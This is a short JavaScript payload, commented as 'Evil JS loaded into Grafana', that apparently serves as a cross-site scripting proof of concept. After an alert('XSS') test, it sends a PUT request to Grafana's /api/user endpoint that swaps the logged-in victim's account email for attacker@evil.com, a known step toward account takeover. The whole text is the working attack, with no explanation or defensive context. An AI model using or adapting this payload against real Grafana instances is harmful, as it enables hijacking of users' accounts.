// Evil JS loaded into Grafana
alert("XSS");

fetch('/api/user', {
  method: 'PUT',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'attacker@evil.com'
  })
});
